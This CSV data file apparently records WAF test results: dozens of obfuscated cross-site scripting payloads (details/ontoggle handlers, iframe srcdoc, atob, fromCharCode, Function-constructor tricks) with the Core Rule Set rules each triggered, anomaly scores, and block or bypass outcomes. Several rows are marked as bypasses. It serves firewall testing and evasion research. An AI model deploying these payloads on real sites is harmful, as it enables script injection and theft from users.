index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2109,<details open ontoggle=(function(){self['\x63onstructor']['\x63onstructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,22v217,104t:urlDecodeUni,t:compressWhitespace || ",20,178029531068.684898
2115,<details open ontoggle=(function(){(function(){})['const'+'ructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,7,"932100,933210,934100,934100,941100,941120,949110","o32,12v217,96 || o23,72v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,96 || o24,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17802953171.435223
2116,<details open ontoggle=(function(){Function(atob('YWxlcnQoMSk='))()})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029531844.296787
2117,<details open ontoggle=(function(){[].filter.constructor(atob('YWxlcnQoMSk='))()})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029531913.976343
2119,<details open ontoggle=(function(){this['con'+'structor']['con'+'structor']('ale'+'rt(1)')()})()>,0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o23,73v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,97 || o24,11v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,22v217,97t:urlDecodeUni,t:compressWhitespace || ",30,178029532262.393642
2123,<details open ontoggle=(function(){window['al'+'ert']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,61 || o24,11v217,61t:urlDecodeUni || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,61t:urlDecodeUni,t:compressWhitespace || ",25,178029532720.406721
2127,<details open ontoggle=(function(){globalThis[`${'\x61'}\u006c${'ert'}`](1)})()>,0,1,block,5,"932130,934100,941100,941120,949110","o47,23v217,80t:urlDecodeUni,t:cmdLine || o24,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178029533248.688474
2128,<details open ontoggle=(function(){top['a\u006cert']`1`})()>,0,1,block,6,"932105,934100,941100,941120,941370,949110","o32,6v217,60 || o24,11v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,17v217,60t:urlDecodeUni,t:compressWhitespace || ",25,178029533366.628971
2129,"<details open ontoggle=(function(){window[String.fromCharCode(97,108,101,114,116)]`1`})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,47v217,90t:urlDecodeUni,t:compressWhitespace || ",20,17802953344.040498
2130,<details open ontoggle=(function(){globalThis['al'+'ert']`1`})()>,0,1,block,5,"934100,934100,941100,941120,949110","o24,11v217,65 || o24,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17802953365.858351
2132,<details open ontoggle=(function(){globalThis[atob('YWxlcnQ=')]`1`})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029533815.147922
2133,<details open ontoggle=(function(){self['al'+'ert']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,59 || o24,11v217,59t:urlDecodeUni || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,16v217,59t:urlDecodeUni,t:compressWhitespace || ",25,17802953391.895084
2134,<details open ontoggle=(function(){window['al\x65rt']`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,61t:urlDecodeUni,t:compressWhitespace || ",20,178029534123.248272
2135,"<details open ontoggle=(function(){(1,globalThis['aler'+'t'])`1`})()>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o23,45v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,69 || o24,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178029534269.034114
2137,"<details open ontoggle=(function(){(1,eval)(String['\x66romCharCode'](97,108,101,114,116,40,49,41))})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,80v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178029534480.452416
2138,<details open ontoggle=(function(){top[atob('YWxlcnQ=')](1)})()>,0,1,block,6,"932105,934100,941100,941120,941370,949110","o32,6v217,64 || o24,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,21v217,64t:urlDecodeUni,t:compressWhitespace || ",25,178029534552.186516
2142,"<details open ontoggle=(function(){top[String.fromCharCode(97,108,101,114,116)]`1`})()>",0,1,block,6,"932105,934100,941100,941120,941370,949110","o32,6v217,87 || o24,11v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,44v217,87t:urlDecodeUni,t:compressWhitespace || ",25,178029535023.465681
2143,<details open ontoggle=(function(){(top)[(atob('YWxlcnQ='))]`1`})()>,0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o32,7v217,68 || o23,44v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,24v217,68t:urlDecodeUni,t:compressWhitespace || ",30,178029535122.572643
2147,<details open ontoggle=(function(){top['al'+'ert'](1)})()>,0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o32,6v217,58 || o23,34v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,58 || o24,11v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,15v217,58t:urlDecodeUni,t:compressWhitespace || ",35,178029535614.638647
2149,<details open ontoggle=(function(){globalThis['al\x65rt'](1)})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17802953591.496613
2150,<details open ontoggle=(function(){parent['a\u006cert'](1)})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029536078.974678
2152,"<details open ontoggle=(function(){top['\u0061\u006c\u0065\u0072\u0074'].apply(null,[1])})()>",0,1,block,6,"932105,934100,941100,941120,941370,949110","o32,6v217,93 || o24,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,37v217,93t:urlDecodeUni,t:compressWhitespace || ",25,178029536321.491542
2158,"<summary><details open ontoggle=(function(){parent['al'+'ert'].call(null,1)})()>",0,1,block,5,"934100,934100,941100,941120,949110","o33,11v217,80 || o33,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178029537053.462223
2159,"<summary><details open ontoggle=(function(){globalThis[String.fromCharCode(97,108,101,114,116)]`1`})()>",0,1,block,4,"934100,941100,941120,949110","o33,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029537165.937168
2161,<marquee><details open ontoggle=(function(){self['al'+'ert']`1`})()>,0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o33,11v217,68 || o33,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,16v217,68t:urlDecodeUni,t:compressWhitespace || ",30,178029537468.787102
2163,"<marquee><details open ontoggle=(function(){window[['al','ert'].join('')]`1`})()>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o33,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,19v217,81t:urlDecodeUni,t:compressWhitespace || ",25,17802953760.871660
2164,<marquee><details open ontoggle=(function(){this['constructor']['constructor']('ale'+'rt(1)')()})()>,0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o32,67v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,100 || o33,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,19v217,100t:urlDecodeUni,t:compressWhitespace || ",35,178029537772.774876
2165,"<marquee><details open ontoggle=(function(){(1,eval)(String.fromCharCode(97,108,101,114,116,40,49,41))})()>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o32,74v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178029537992.831440
2166,<article><details open ontoggle=(function(){top['al'+'ert']`1`})()>,0,1,block,7,"932105,934100,934100,941100,941120,941370,949110","o41,6v217,67 || o33,11v217,67 || o33,11v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,15v217,67t:urlDecodeUni,t:compressWhitespace || ",30,178029538032.207194
2167,<article><details open ontoggle=(function(){window[atob('YWxlcnQ=')]`1`})()>,0,1,block,5,"934100,941100,941120,941370,949110","o33,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,24v217,76t:urlDecodeUni,t:compressWhitespace || ",20,178029538132.841245
2168,"<article><details open ontoggle=(function(){this['ale'+'rt']['call'](this,1)})()>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o32,48v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,81 || o33,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,16v217,81t:urlDecodeUni,t:compressWhitespace || ",30,178029538223.314290
2169,"<article><details open ontoggle=(function(){(1,window['al'+'ert'])`1`})()>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o32,41v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,74 || o33,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,18v217,74t:urlDecodeUni,t:compressWhitespace || ",30,178029538365.823852
2170,<article><details open ontoggle=(function(){return[window]['pop']()['ale'+'rt']`1`})()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o32,54v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,87 || o33,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178029538582.268683
2187,<details open ontoggle=self['Function']['constructor']('al\x65rt(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o27,44v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,16v217,72t:urlDecodeUni,t:compressWhitespace || ",20,178029540681.299208
2199,<details open ontoggle=top['Function']['constructor']('return\x20alert')()('1')>,0,1,block,5,"933210,941100,941120,941370,949110","o26,53v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,15v217,80t:urlDecodeUni,t:compressWhitespace || ",20,178029542166.519874
2209,<details open onToggle=Function(atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941120","v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178029543455.343250
2214,<details open onToggle=new/**/Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178029544035.283054
2231,<details open ontoggle=self['Function']('\u0061lert(1)')()>,0,1,block,5,"933210,941100,941120,941370,949110","o27,31v216,59t:urlDecode,t:replaceComments,t:compressWhitespace || v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,16v216,59t:urlDecodeUni,t:compressWhitespace || ",20,178029546035.852787
2248,"<details open ontoggle=window.top.Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,4,"934100,941100,941120,949110","o43,19v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029548222.335240
2259,"<details open ontoggle=(0,Function.prototype.constructor)(atob('YWxlcnQoMSk='))()>",0,1,bypass,2,"941100,941120","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17802954962.174112
2264,"<details open ontoggle=(1,Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()>",0,1,block,4,"934100,941100,941120,949110","o35,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178029550286.219634
2280,"<details open ontoggle=setTimeout(function(){this['constru'+'ctor']['constru'+'ctor']('ale'+'rt(1)')()},0)>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o33,73v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,107 || o34,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,22v217,107t:urlDecodeUni,t:compressWhitespace || ",30,178029552297.518855
2284,"<details open ontoggle=setTimeout(function(){window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,5,"934100,941100,941120,941370,949110","o34,11v217,143 || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,43v217,143t:urlDecodeUni,t:compressWhitespace || ",20,178029552719.014625
2286,"<details open ontoggle=setTimeout(function(){this[unescape('%65%76%61%6c')](String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o33,88v217,130t:urlDecode,t:replaceComments,t:compressWhitespace || o34,11v217,130 || o34,11v217,130t:urlDecodeUni || v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,22v217,130t:urlDecodeUni,t:compressWhitespace || ",30,178029553072.394211
2297,"<iframe srcdoc=""<script>top['Function']('retu'+'rn al'+'ert')()(1)</script>"">",0,1,block,6,"933210,941100,941110,941160,941370,949110","o27,39v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,77t:urlDecodeUni,t:compressWhitespace || ",25,178029554462.356802
2315,"<iframe srcdoc=""&lt;svg/onload&equals;(Function(&apos;a&apos;&plus;&apos;lert(1)&apos;))()&gt;"">",0,1,block,4,"941100,941160,942100,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,96 || ",15,178029556633.050174
2318,"<iframe srcdoc=""&lt;details/open/ontoggle&equals;&lsqb;&rsqb;&lsqb;&DiacriticalGrave;constructor&DiacriticalGrave;&rsqb;&lsqb;&DiacriticalGrave;constructor&DiacriticalGrave;&rsqb;&lpar;String&period;fromCharCode&lpar;97&comma;108&comma;101&comma;114&comma;116&comma;40&comma;49&comma;41&rpar;&rpar;&lpar;&rpar;&gt;"">",0,1,block,4,"941100,941160,942100,949110","v217,316t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,316t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,316 || ",15,178029556933.766047
2329,"<iframe srcdoc=""&#60;script&#62;(window['Function']('a'+'lert(1)'))()&#60;/script&#62;"">",0,1,block,6,"933210,941100,941110,941160,941370,949110","o32,37v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,18v217,88t:urlDecodeUni,t:compressWhitespace || ",25,178029558352.156875
2332,"<iframe srcdoc=""<body onpageshow=(parent['Function']('a'+'lert(1)'))()>"">",0,1,block,5,"933210,941100,941120,941160,949110","o33,37v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,33v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178029558649.554557
2362,"<iframe srcdoc=""&lt;details open ontoggle&equals;this&lbrack;&apos;ownerDocument&apos;&rbrack;&lbrack;&apos;defaultView&apos;&rbrack;&lbrack;&apos;Function&apos;&rbrack;&lpar;&apos;ale&apos;&plus;&apos;rt&lpar;1&rpar;&apos;&rpar;&lpar;&rpar;&gt;""></iframe>",0,1,block,4,"941100,941160,942100,949110","v217,256t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,256t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,256 || ",15,17802956257.277881
2372,"<iframe srcdoc=""<script>parent['Function']['call'](null,'ale'+'rt(1)')()</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o30,42v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178029563735.848455
